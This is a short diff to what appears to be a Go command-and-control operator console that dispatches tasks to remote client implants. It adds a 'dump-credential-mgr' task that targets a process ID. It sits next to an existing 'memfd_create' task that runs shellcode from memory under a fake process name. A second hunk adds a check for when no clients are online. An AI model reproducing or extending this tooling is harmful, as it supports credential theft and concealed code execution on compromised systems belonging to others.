@@ -647,6 +647,8 @@ func SendTask(clientId string, command string, c *ishell.Context) {
 		PrepareTaskWithOneArg(c, clientId, command, "<command>: ")
 	case "memfd_create":
 		PrepareShellcodeTask(c, clientId, command, "<localFile> <fakeProcessName>: ")
+	case "dump-credential-mgr":
+		PrepareTaskWithOneArg(c, clientId, command, "<pid>: ")
 	default:
 		c.Println("Task not found.")
 	}
@@ -839,6 +841,10 @@ func OperatorMainLoop() {
 			clientsArray, err := GetOnlineClientIds() //GetClientIds()
 			if err != nil {
 				c.Printf("%s", err.Error())
+				return
+			}
+			if len(clientsArray) == 0 {
+				c.Printf("No clients online")
 				return
 			}
 			choice := c.MultiChoice(clientsArray, "Choose a client")
